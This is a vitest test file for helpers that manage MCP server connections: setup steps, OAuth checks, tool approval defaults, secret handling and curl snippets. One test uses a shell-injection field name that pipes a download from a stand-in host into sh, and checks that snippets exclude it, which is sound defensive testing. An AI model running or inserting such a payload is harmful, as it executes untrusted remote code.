import { describe, expect, it } from "vitest";
import type {
	McpAdoptedTool,
	McpSignIn,
	McpToolSnapshot,
	McpUpstream,
} from "@/hooks/api/use-mcp-upstreams";
import {
	adoptionCounts,
	checkSummary,
	checkWarning,
	credentialSecretName,
	curlSnippet,
	exampleInput,
	filterRows,
	groupRows,
	groupSelectable,
	initialChoice,
	lastCheckedCell,
	looselyChecked,
	mcpToolName,
	nextStep,
	normalizeServerUrl,
	oauthProblem,
	refusalHeadline,
	registration,
	secretFit,
	secretNameFor,
	secretProblem,
	selectionSummary,
	serverNameProblem,
	serverStatus,
	signInLabel,
	signInProgress,
	suggestName,
	toolInputs,
	toolRows,
} from "./mcp-servers";
import type { Secret } from "./types";

const tool = (
	name: string,
	suggestedClass: McpToolSnapshot["suggestedClass"] = "read",
	description = `${name} does a thing`,
): McpToolSnapshot => ({
	name,
	hash: `sha256:${name}`,
	definition: { name, description, inputSchema: { type: "object" } },
	suggestedClass,
	reasons: [],
});

const adopted = (
	name: string,
	state: McpAdoptedTool["state"] = "current",
	enabled = true,
): McpAdoptedTool => ({
	tool: name,
	action: `srv-${name}`,
	actionId: `act_${name}`,
	enabled,
	state,
});

const server = (over: Partial<McpUpstream> = {}): McpUpstream => ({
	id: "mcpu_1",
	name: "srv",
	url: "https://mcp.example.com/mcp",
	headers: {},
	registryName: null,
	protocolVersion: "2025-06-18",
	serverInfo: null,
	tools: [],
	toolsHash: null,
	listedAt: "2026-10-31T10:00:00.000Z",
	lastError: null,
	listedWith: "anonymous",
	oauth: null,
	adopted: [],
	archivedAt: null,
	createdAt: "2026-10-31T09:00:00.000Z",
	updatedAt: "2026-10-31T10:00:00.000Z",
	...over,
});

const oauth = (
	over: Partial<NonNullable<McpUpstream["oauth"]>> = {},
): NonNullable<McpUpstream["oauth"]> => ({
	resource: "https://mcp.example.com/mcp",
	issuer: "https://auth.example.com",
	authorizationServers: ["https://auth.example.com"],
	clientRegistration: "pre_registered",
	authorizationEndpoint: "https://auth.example.com/authorize",
	tokenEndpoint: "https://auth.example.com/token",
	scopesSupported: [],
	scopes: [],
	clientId: "client",
	advertised: {
		dynamicRegistration: false,
		clientIdMetadataDocuments: false,
		pkceS256: true,
	},
	publicClient: false,
	redirectUri: "https://api.example.com/callback",
	operatorConnected: false,
	...over,
});

const secret = (over: Partial<Secret> = {}): Secret =>
	({
		name: "KEY",
		kind: "stored",
		allowedHosts: [],
		...over,
	}) as Secret;

const signIn = (over: Partial<McpSignIn> = {}): McpSignIn =>
	({
		issuer: "https://auth.example.com",
		authorizationHost: "auth.example.com",
		tokenHost: "auth.example.com",
		scopesSupported: ["read", "write"],
		advertised: {
			dynamicRegistration: false,
			clientIdMetadataDocuments: false,
			pkceS256: true,
		},
		redirectUri: "https://api.example.com/callback",
		...over,
	}) as McpSignIn;

describe("addresses and names", () => {
	it("gives a bare host https, and leaves a scheme for the API to judge", () => {
		expect(normalizeServerUrl("  mcp.linear.app/mcp ")).toBe(
			"https://mcp.linear.app/mcp",
		);
		expect(normalizeServerUrl("http://a.example/mcp")).toBe(
			"http://a.example/mcp",
		);
		expect(normalizeServerUrl("   ")).toBe("");
	});

	it("names a server after what its host calls it", () => {
		expect(suggestName("https://mcp.linear.app/mcp")).toBe("linear");
		expect(suggestName("https://api.githubcopilot.com/mcp")).toBe(
			"githubcopilot",
		);
		expect(suggestName("https://mcp.notion.com/mcp")).toBe("notion");
	});

	it("numbers a name already taken", () => {
		expect(suggestName("https://mcp.linear.app/mcp", ["linear"])).toBe(
			"linear-2",
		);
		expect(
			suggestName("https://mcp.linear.app/mcp", ["linear", "linear-2"]),
		).toBe("linear-3");
	});

	it("always suggests what the API accepts", () => {
		for (const url of [
			"https://123.example.com/mcp",
			"https://new.example.com/mcp",
			"https://localhost/mcp",
			"https://Weird_Host.example.com/mcp",
			`https://${"a".repeat(60)}.example.com/mcp`,
		]) {
			expect(serverNameProblem(suggestName(url), [])).toBeNull();
		}
	});

	it("says what is wrong with a name", () => {
		expect(serverNameProblem("", [])).toMatch(/Give the server a name/);
		expect(serverNameProblem("Linear", [])).toMatch(/lowercase/);
		expect(serverNameProblem("1linear", [])).toMatch(/starting with a letter/);
		expect(serverNameProblem("a".repeat(33), [])).toMatch(/32 at most/);
		expect(serverNameProblem("new", [])).toMatch(/reserved/);
		expect(serverNameProblem("linear", ["linear"])).toMatch(/already exists/);
		expect(serverNameProblem("linear-2", ["linear"])).toBeNull();
	});

	it("names a secret after its server", () => {
		expect(secretNameFor("my-linear", "CLIENT_SECRET")).toBe(
			"MY_LINEAR_CLIENT_SECRET",
		);
		expect(secretNameFor("billing", "MCP_TOKEN")).toBe("BILLING_MCP_TOKEN");
	});
});

describe("the next step", () => {
	it("asks for a sign-in when an OAuth server has never been listed", () => {
		expect(
			nextStep(server({ oauth: oauth(), listedAt: null, listedWith: null })),
		).toEqual({ kind: "sign-in" });
	});

	it("puts a sign-in before a failed listing, since listing again cannot help", () => {
		const step = nextStep(
			server({
				oauth: oauth(),
				listedAt: null,
				lastError: { code: "x", message: "401", at: "2026-10-31T10:00:00Z" },
			}),
		);
		expect(step.kind).toBe("sign-in");
	});

	it("does not ask an OAuth server that lists anonymously to sign in first", () => {
		const step = nextStep(server({ oauth: oauth(), tools: [tool("a")] }));
		expect(step).toEqual({ kind: "choose-tools", toolCount: 1 });
	});

	it("puts a failed listing before everything it could make stale", () => {
		const step = nextStep(
			server({
				tools: [tool("a")],
				adopted: [adopted("a", "changed")],
				lastError: {
					code: "x",
					message: "HTTP 502",
					at: "2026-10-31T10:00:00Z",
				},
			}),
		);
		expect(step).toEqual({
			kind: "listing-failed",
			message: "HTTP 502",
			at: "2026-10-31T10:00:00Z",
		});
	});

	it("asks for a review when an adopted tool changed or is gone", () => {
		const step = nextStep(
			server({
				tools: [tool("a"), tool("b")],
				adopted: [
					adopted("a", "changed"),
					adopted("b"),
					adopted("c", "missing"),
				],
			}),
		);
		expect(step).toEqual({ kind: "review", changed: 1, missing: 1 });
	});

	it("says nothing is listed, then to choose, then what is live", () => {
		expect(nextStep(server()).kind).toBe("no-tools");
		expect(nextStep(server({ tools: [tool("a"), tool("b")] }))).toEqual({
			kind: "choose-tools",
			toolCount: 2,
		});
		expect(
			nextStep(
				server({
					tools: [tool("a"), tool("b")],
					adopted: [adopted("a"), adopted("b", "current", false)],
				}),
			),
		).toEqual({ kind: "live", live: 1 });
	});

	it("names the step as the status in the list", () => {
		const statusOf = (over: Partial<McpUpstream>) => serverStatus(server(over));
		expect(statusOf({ oauth: oauth(), listedAt: null })).toEqual({
			label: "Needs sign-in",
			tone: "warning",
		});
		expect(
			statusOf({
				lastError: { code: "x", message: "m", at: "2026-10-31T10:00:00Z" },
			}),
		).toEqual({ label: "Listing failed", tone: "error" });
		expect(
			statusOf({
				tools: [tool("a")],
				adopted: [adopted("a", "changed"), adopted("b", "missing")],
			}),
		).toEqual({ label: "2 changed", tone: "warning" });
		expect(statusOf({})).toEqual({ label: "No tools listed", tone: "neutral" });
		expect(statusOf({ tools: [tool("a")] })).toEqual({
			label: "Choose tools",
			tone: "info",
		});
		expect(statusOf({ tools: [tool("a")], adopted: [adopted("a")] })).toEqual({
			label: "1 live",
			tone: "success",
		});
	});

	it("counts what an agent can really call as live", () => {
		expect(
			adoptionCounts(
				server({
					adopted: [
						adopted("a"),
						adopted("b", "current", false),
						adopted("c", "changed"),
						adopted("d", "missing"),
					],
				}),
			),
		).toEqual({ live: 1, changed: 1, missing: 1, adopted: 4 });
	});

	it("says how a server signs in, and reads only the secret's name", () => {
		const stored = server({
			headers: { Authorization: "Bearer {{secret:BILLING_TOKEN}}" },
		});
		expect(signInLabel(stored)).toBe("Stored credential");
		expect(credentialSecretName(stored)).toBe("BILLING_TOKEN");
		expect(signInLabel(server({ oauth: oauth() }))).toBe("OAuth");
		expect(signInLabel(server())).toBe("None");
		expect(
			credentialSecretName(server({ headers: { "X-Plain": "v" } })),
		).toBeNull();
	});
});

describe("waiting on a sign-in", () => {
	const start = {
		url: "https://auth.example.com/authorize",
		expiresAt: "2026-10-31T10:10:00.000Z",
		updatedAt: "2026-10-31T10:00:00.000Z",
		listedAt: null,
		errorAt: null,
	};
	const before = new Date("2026-10-31T10:05:00.000Z").getTime();
	const after = new Date("2026-10-31T10:11:00.000Z").getTime();
	const row = (over: Partial<McpUpstream>) =>
		server({ listedAt: null, updatedAt: start.updatedAt, ...over });

	it("waits while nothing on the server moved", () => {
		expect(signInProgress(start, row({}), before)).toBe("waiting");
	});

	it("expires only when the link has run out", () => {
		expect(signInProgress(start, row({}), after)).toBe("expired");
	});

	it("is listing once the grant is recorded", () => {
		expect(
			signInProgress(
				start,
				row({ updatedAt: "2026-10-31T10:06:00.000Z" }),
				before,
			),
		).toBe("listing");
	});

	it("ends on a new listing, even after the link's time", () => {
		expect(
			signInProgress(
				start,
				row({ listedAt: "2026-10-31T10:06:00.000Z" }),
				after,
			),
		).toBe("listed");
	});

	it("ends on a new error", () => {
		expect(
			signInProgress(
				start,
				row({
					lastError: {
						code: "x",
						message: "m",
						at: "2026-10-31T10:06:00.000Z",
					},
				}),
				before,
			),
		).toBe("failed");
	});
});

describe("tools", () => {
	const mixed = server({
		tools: [
			tool("get_issue", "read"),
			tool("list_pulls", "read", "Lists pull requests"),
			tool("create_issue", "write"),
			tool("add_comment", "write"),
			tool("merge", "irreversible"),
			tool("delete_repo", "destructive"),
		],
		adopted: [
			adopted("get_issue"),
			adopted("add_comment", "changed"),
			adopted("merge", "current", false),
			adopted("dropped", "missing"),
		],
	});
	const rows = toolRows(mixed);
	const byName = (name: string) => {
		const row = rows.find((item) => item.name === name);
		if (!row) throw new Error(name);
		return row;
	};

	it("gives every tool its state, including one the server dropped", () => {
		expect(byName("get_issue").state).toBe("live");
		expect(byName("list_pulls").state).toBe("available");
		expect(byName("add_comment").state).toBe("changed");
		expect(byName("merge").state).toBe("disabled");
		expect(byName("dropped")).toMatchObject({
			state: "missing",
			tool: null,
			risk: null,
		});
	});

	it("filters by what needs doing and by search", () => {
		const names = (filter: Parameters<typeof filterRows>[2], query = "") =>
			filterRows(rows, query, filter).map((row) => row.name);
		expect(names("review").sort()).toEqual(["add_comment", "dropped"]);
		expect(names("adopted").sort()).toEqual([
			"add_comment",
			"dropped",
			"get_issue",
			"merge",
		]);
		expect(names("all", "DELETE")).toEqual(["delete_repo"]);
		expect(names("all", "pull requests")).toEqual(["list_pulls"]);
		expect(names("review", "delete")).toEqual([]);
	});

	it("groups mildest first, with what was dropped and what changed on top", () => {
		const groups = groupRows(rows);
		expect(groups.map((group) => group.key)).toEqual([
			"gone",
			"read",
			"write",
			"irreversible",
			"destructive",
		]);
		expect(groups[2]?.rows.map((row) => row.name)).toEqual([
			"add_comment",
			"create_issue",
		]);
	});

	it("leaves out a group with nothing in it", () => {
		const groups = groupRows(filterRows(rows, "delete", "all"));
		expect(groups.map((group) => group.key)).toEqual(["destructive"]);
	});

	it("selects only new tools in one click, so a changed tool is read first", () => {
		const write = groupRows(rows)[2]?.rows ?? [];
		expect(groupSelectable(write).map((row) => row.name)).toEqual([
			"create_issue",
		]);
	});

	it("starts a dangerous tool with approval on, a mild one with it off", () => {
		expect(initialChoice(byName("list_pulls"))).toEqual({
			requiresApproval: false,
			toolHash: "sha256:list_pulls",
		});
		expect(initialChoice(byName("create_issue"))).toEqual({
			requiresApproval: false,
			toolHash: "sha256:create_issue",
		});
		expect(initialChoice({ ...byName("merge"), state: "available" })).toEqual({
			requiresApproval: true,
			toolHash: "sha256:merge",
		});
		expect(initialChoice(byName("delete_repo"))).toEqual({
			requiresApproval: true,
			toolHash: "sha256:delete_repo",
		});
	});

	it("suggests approval for a loosely checked tool whatever its class, as adopted first", () => {
		const loose = toolRows(
			server({
				tools: [
					{
						...tool("search"),
						schemaCheck: "loose",
						schemaCheckReason: "remote_ref",
					},
					{
						...tool("lookup"),
						schemaCheck: "loose",
						schemaCheckReason: "remote_ref",
					},
				],
				adopted: [
					{
						...adopted("lookup"),
						schemaCheck: "full",
						schemaCheckReason: null,
					},
				],
			}),
		);
		const search = loose.find((row) => row.name === "search");
		const lookup = loose.find((row) => row.name === "lookup");
		if (!search || !lookup) throw new Error("rows missing");
		expect(looselyChecked(search)).toBe(true);
		expect(initialChoice(search)).toEqual({
			requiresApproval: true,
			toolHash: "sha256:search",
		});
		expect(looselyChecked(lookup)).toBe(false);
		expect(looselyChecked(byName("list_pulls"))).toBe(false);
	});

	it("sends no approval setting when re-adopting, since the action keeps its own", () => {
		expect(initialChoice(byName("add_comment"))).toEqual({
			toolHash: "sha256:add_comment",
		});
	});

	it("sums up a selection", () => {
		expect(selectionSummary({ a: {} })).toBe("1 tool selected");
		expect(
			selectionSummary({
				a: { requiresApproval: true },
				b: { requiresApproval: false },
				c: {},
			}),
		).toBe("3 tools selected, 1 requires approval");
		expect(
			selectionSummary(
				{ a: { requiresApproval: true }, b: { requiresApproval: true }, c: {} },
				1,
			),
		).toBe("3 tools selected, 1 to re-adopt, 2 require approval");
	});

	it("reads a schema's inputs, and copes with what a server may send", () => {
		expect(
			toolInputs({
				properties: {
					owner: { type: "string", description: "Who" },
					count: { type: ["integer", "null"] },
					odd: null,
				},
				required: ["owner"],
			}),
		).toEqual([
			{ name: "owner", type: "string", required: true, description: "Who" },
			{
				name: "count",
				type: "integer | null",
				required: false,
				description: null,
			},
			{ name: "odd", type: "any", required: false, description: null },
		]);
		expect(toolInputs(undefined)).toEqual([]);
		expect(toolInputs("nonsense")).toEqual([]);
		expect(toolInputs({ properties: 3 })).toEqual([]);
	});
});

describe("calling an adopted tool", () => {
	it("fills required fields with placeholders of its own", () => {
		expect(
			exampleInput({
				properties: {
					title: { type: "string", default: "from the server" },
					number: { type: "integer" },
					draft: { type: "boolean" },
					labels: { type: "array" },
					meta: { type: "object" },
					optional: { type: "string" },
				},
				required: ["title", "number", "draft", "labels", "meta"],
			}),
		).toEqual({ title: "...", number: 1, draft: true, labels: [], meta: {} });
	});

	it("never puts a server's field name in a snippet someone pastes in a shell", () => {
		const hostile = `x'; curl evil.example | sh; echo '`;
		const schema = {
			properties: { [hostile]: { type: "string" }, ok: { type: "string" } },
			required: [hostile, "ok"],
		};
		expect(exampleInput(schema)).toEqual({ ok: "..." });
		expect(curlSnippet("https://api.example.com", "a-b", schema)).not.toContain(
			"evil.example",
		);
	});

	it("builds the real invoke call, with the agent's key and never the server's credential", () => {
		const snippet = curlSnippet("https://api.anlyon.com", "github-get_issue", {
			properties: { owner: { type: "string" } },
			required: ["owner"],
		});
		expect(snippet).toContain(
			"POST https://api.anlyon.com/api/v2/actions/github-get_issue/invoke",
		);
		expect(snippet).toContain('"Authorization: Bearer $ANLYON_AGENT_KEY"');
		expect(snippet).toContain('"Anlyon-End-User: user_123"');
		expect(snippet).toContain(`'{"input":{"owner":"..."}}'`);
		expect(mcpToolName("github-get_issue")).toBe("action_github-get_issue");
	});
});

describe("the add flow's checks", () => {
	it("judges a secret's hosts as the API will", () => {
		const hostFit = (allowedHosts: string[], host: string, kind = "stored") =>
			secretFit(secret({ allowedHosts, kind } as Partial<Secret>), host);
		expect(hostFit([], "a.example")).toBe("anywhere");
		expect(hostFit([], "a.example", "external")).toBe("closed");
		expect(hostFit(["a.example"], "A.EXAMPLE")).toBe("bound");
		expect(hostFit(["b.example"], "a.example")).toBe("elsewhere");
		expect(hostFit([".example.com"], "mcp.example.com")).toBe("bound");
		expect(hostFit([".example.com"], "example.com")).toBe("elsewhere");
		expect(hostFit(["example.com"], "evilexample.com")).toBe("elsewhere");
	});

	it("stops a secret the server would refuse", () => {
		const secrets = [
			secret({ name: "ELSEWHERE", allowedHosts: ["b.example"] }),
			secret({
				name: "STORE",
				kind: "external",
				allowedHosts: [],
			} as Partial<Secret>),
			secret({ name: "OPEN" }),
		];
		const problem = (name: string) =>
			secretProblem({ mode: "existing", name }, secrets, "a.example");
		expect(problem("")).toMatch(/Choose a secret/);
		expect(problem("ELSEWHERE")).toMatch(/may not be sent to a\.example/);
		expect(problem("STORE")).toMatch(/sent nowhere/);
		expect(problem("OPEN")).toBeNull();
	});

	it("checks a new secret before anything is stored", () => {
		const check = (name: string, value: string) =>
			secretProblem(
				{ mode: "new", name, value },
				[secret({ name: "TAKEN" })],
				"a.example",
			);
		expect(check("lower", "v")).toMatch(/uppercase/);
		expect(check("TAKEN", "v")).toMatch(/already exists/);
		expect(check("FRESH", "")).toMatch(/Paste/);
		expect(check("FRESH", "v")).toBeNull();
	});

	it("requires a scope whenever the server advertises any, because none means all", () => {
		const form = {
			clientId: "abc",
			secret: null,
			scopes: [] as string[],
		};
		expect(oauthProblem(form, signIn(), [])).toMatch(/at least one scope/);
		expect(
			oauthProblem({ ...form, scopes: ["read"] }, signIn(), []),
		).toBeNull();
		expect(oauthProblem(form, signIn({ scopesSupported: [] }), [])).toBeNull();
	});

	it("checks the client id and the secret against the token host", () => {
		const form = { clientId: "abc", secret: null, scopes: ["read"] };
		expect(oauthProblem({ ...form, clientId: " " }, signIn(), [])).toMatch(
			/Paste the client id/,
		);
		expect(
			oauthProblem(
				{ ...form, clientId: "https://me.example/client.json" },
				signIn(),
				[],
			),
		).toMatch(/Client ID Metadata Document/);
		expect(
			oauthProblem(
				{ ...form, secret: { mode: "existing", name: "S" } },
				signIn(),
				[secret({ name: "S", allowedHosts: ["other.example"] })],
			),
		).toMatch(/may not be sent to auth\.example\.com/);
		expect(
			oauthProblem(
				{ ...form, secret: { mode: "existing", name: "S" } },
				signIn(),
				[secret({ name: "S", allowedHosts: ["auth.example.com"] })],
			),
		).toBeNull();
	});

	it("stops OAuth on a deployment with no callback", () => {
		expect(
			oauthProblem(
				{ clientId: "abc", secret: null, scopes: ["read"] },
				signIn({ redirectUri: null }),
				[],
			),
		).toMatch(/cannot sign people in/);
	});

	it("gives a refusal in words, and something for a reason it does not know", () => {
		expect(refusalHeadline("pkce_unsupported")).toMatch(/PKCE/);
		expect(refusalHeadline("something_new")).toMatch(/will not sign in/);
	});
});

describe("the register request", () => {
	const url = "https://mcp.example.com/mcp";

	it("carries a secret only as a reference, never its value", () => {
		const credential = registration("srv", url, {
			kind: "credential",
			form: {
				secret: { mode: "new", name: "SRV_TOKEN", value: "hunter2" },
				header: "bearer",
			},
		});
		expect(credential).toEqual({
			name: "srv",
			url,
			headers: { Authorization: "Bearer {{secret:SRV_TOKEN}}" },
		});

		const keyed = registration("srv", url, {
			kind: "credential",
			form: {
				secret: { mode: "existing", name: "SRV_TOKEN" },
				header: "x-api-key",
			},
		});
		expect(keyed.headers).toEqual({ "X-API-Key": "{{secret:SRV_TOKEN}}" });

		const signingIn = registration("srv", url, {
			kind: "oauth",
			form: {
				clientId: " abc ",
				secret: { mode: "new", name: "SRV_SECRET", value: "hunter2" },
				scopes: ["read"],
			},
		});
		expect(signingIn.oauth).toEqual({
			clientId: "abc",
			clientSecret: "{{secret:SRV_SECRET}}",
			scopes: ["read"],
		});
		expect(JSON.stringify([credential, keyed, signingIn])).not.toContain(
			"hunter2",
		);
	});

	it("sends no secret for a public client and no scopes when none are advertised", () => {
		expect(
			registration("srv", url, {
				kind: "oauth",
				form: { clientId: "abc", secret: null, scopes: [] },
			}),
		).toEqual({ name: "srv", url, oauth: { clientId: "abc" } });
	});

	it("sends no client at all with Anlyon's own, even with a leftover id or secret in the form", () => {
		expect(
			registration("srv", url, {
				kind: "oauth",
				form: {
					anlyonClient: true,
					clientId: "left-over",
					secret: { mode: "new", name: "LEFT_OVER", value: "v" },
					scopes: ["read"],
				},
			}),
		).toEqual({ name: "srv", url, oauth: { scopes: ["read"] } });
	});

	it("asks for no client id or secret with Anlyon's own, and still requires a scope", () => {
		const form = {
			anlyonClient: true,
			clientId: "",
			secret: { mode: "new" as const, name: "", value: "" },
			scopes: [] as string[],
		};
		expect(oauthProblem(form, signIn(), [])).toMatch(/at least one scope/);
		expect(
			oauthProblem({ ...form, scopes: ["read"] }, signIn(), []),
		).toBeNull();
	});

	it("sends only a name and an address for a server with no sign-in", () => {
		expect(registration(" srv ", url, { kind: "none" })).toEqual({
			name: "srv",
			url,
		});
	});
});

describe("whether a server is being checked", () => {
	const check = (
		over: Partial<NonNullable<McpUpstream["check"]>> = {},
	): NonNullable<McpUpstream["check"]> => ({
		status: "ok",
		checkedAt: "2026-11-01T10:00:00.000Z",
		nextCheckAt: "2026-11-02T10:00:00.000Z",
		failures: 0,
		...over,
	});

	it("says no change only when it did check", () => {
		const summary = checkSummary(server({ check: check() }));
		expect(summary).toMatchObject({
			kind: "ok",
			lead: "Checked",
			tail: "No change",
		});
	});

	it("does not say no change when a change is open", () => {
		const summary = checkSummary(
			server({
				check: check(),
				changes: [
					{
						tool: "a",
						kind: "changed",
						action: "srv-a",
						actionId: "act_a",
						pinnedHash: "1",
						currentHash: "2",
						suggestedClass: "read",
						before: null,
						detectedAt: "2026-11-01T10:00:00.000Z",
					},
				],
			}),
		);
		expect(summary?.tail).toBeNull();
	});

	it("never reports no change for a server it cannot check", () => {
		const summary = checkSummary(
			server({
				check: check({ status: "needs_sign_in", nextCheckAt: null }),
			}),
		);
		expect(summary?.lead).toMatch(/^Not being checked/);
		expect(summary?.tail).not.toMatch(/No change/);
		expect(summary?.tail).toMatch(/still refused when an agent calls it/);
	});

	it("never reports no change after a failed check", () => {
		const summary = checkSummary(
			server({ check: check({ status: "failed", failures: 3 }) }),
		);
		expect(summary?.lead).toMatch(/^The last 3 checks failed/);
		expect(summary?.tail).not.toMatch(/No change/);
	});

	it("leaves a server that has never been listed to the next step", () => {
		expect(
			checkSummary(
				server({ listedAt: null, check: check({ status: "needs_sign_in" }) }),
			),
		).toBeNull();
		expect(checkSummary(server({ check: undefined }))).toBeNull();
	});

	it("the list shows no time for a server it cannot check", () => {
		expect(
			lastCheckedCell(server({ check: check({ status: "needs_sign_in" }) })),
		).toEqual({ prefix: null, at: null, text: "Cannot check" });
		expect(
			checkWarning(server({ check: check({ status: "needs_sign_in" }) })),
		).toBe("Cannot be checked");
	});

	it("the list says when the last check failed", () => {
		expect(
			lastCheckedCell(server({ check: check({ status: "failed" }) })),
		).toEqual({
			prefix: "Failed",
			at: "2026-11-01T10:00:00.000Z",
			text: null,
		});
		expect(checkWarning(server({ check: check({ status: "failed" }) }))).toBe(
			"Last check failed",
		);
	});

	it("the list falls back to the listing before the first check", () => {
		expect(
			lastCheckedCell(
				server({ check: check({ status: "pending", checkedAt: null }) }),
			),
		).toEqual({ prefix: null, at: "2026-10-31T10:00:00.000Z", text: null });
		expect(lastCheckedCell(server({ listedAt: null }))).toEqual({
			prefix: null,
			at: null,
			text: "Never",
		});
		expect(checkWarning(server({ check: check() }))).toBeNull();
	});
});
